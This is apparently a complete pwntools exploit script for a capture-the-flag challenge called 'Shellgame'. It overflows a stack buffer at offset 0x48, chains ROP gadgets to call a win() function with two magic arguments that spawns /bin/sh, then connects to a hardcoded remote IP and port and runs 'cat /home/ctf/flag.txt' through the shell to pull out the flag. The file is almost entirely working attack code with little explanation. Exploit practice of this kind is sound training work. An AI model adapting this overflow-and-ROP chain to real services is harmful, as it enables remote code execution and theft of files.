#!/usr/bin/env python3
"""q1 — Shellgame: overflow 0x48 → ROP to win(0xdeadbeef, 0xcafebabe) → shell.

win() at 0x401210 checks edi==0xdeadbeef and esi==0xcafebabe then
system("/bin/sh"). A leading `ret` gadget fixes the stack alignment
(win is entered via ret, not call).
"""
from pwn import *

context.binary = elf = ELF('player/chall')
context.log_level = 'error'

OFF = 0x48
RET = 0x40120a
POP_RDI = 0x401204
POP_RSI = 0x401206
WIN = 0x401210

payload = b'A' * OFF
payload += p64(RET)
payload += p64(POP_RDI) + p64(0xdeadbeef)
payload += p64(POP_RSI) + p64(0xcafebabe)
payload += p64(WIN)

io = remote('35.192.106.100', 20001)
io.recvline()
io.send(payload)
io.sendline(b'cat /home/ctf/flag.txt')
data = io.recvall(timeout=6).decode(errors='replace')
flag = next(l for l in data.splitlines() if '0xV01D{' in l).strip('$ ').strip()
print("FLAG:", flag)
